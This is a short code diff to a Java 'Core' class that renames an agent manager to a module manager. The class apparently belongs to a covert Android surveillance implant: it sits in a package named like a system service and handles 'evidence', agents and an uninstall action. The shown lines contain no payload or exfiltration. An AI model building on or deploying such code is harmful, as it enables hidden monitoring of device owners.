@@ -34,7 +34,7 @@ import com.android.service.evidence.Evidence;
 import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
-import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerModule;
 import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -62,7 +62,7 @@ public class Core extends Activity implements Runnable {
 	private ContentResolver contentResolver;
 
 	/** The agent manager. */
-	private ManagerAgent agentManager;
+	private ManagerModule moduleManager;
 
 	/** The event manager. */
 	private ManagerEvent eventManager;
@@ -93,7 +93,7 @@ public class Core extends Activity implements Runnable {
 
 		coreThread = new Thread(this);
 
-		agentManager = ManagerAgent.self();
+		moduleManager = ManagerModule.self();
 		eventManager = ManagerEvent.self();
 
 		resources = r;
@@ -302,7 +302,7 @@ public class Core extends Activity implements Runnable {
 			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
 		}
 
-		agentManager.stopAll();
+		moduleManager.stopAll();
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
@@ -376,8 +376,8 @@ public class Core extends Activity implements Runnable {
 			}
 
 			/*
-			 * if (agentManager.startAll() == false) { if (Cfg.DEBUG) {
-			 * Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$ }
+			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
+			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
 			 * 
 			 * return ConfType.Error; }
 			 */
@@ -605,7 +605,6 @@ public class Core extends Activity implements Runnable {
 					}
 
 					// UninstallAction.actualExecute();
-
 					exit = Exit.UNINSTALL;
 					break;
 				}
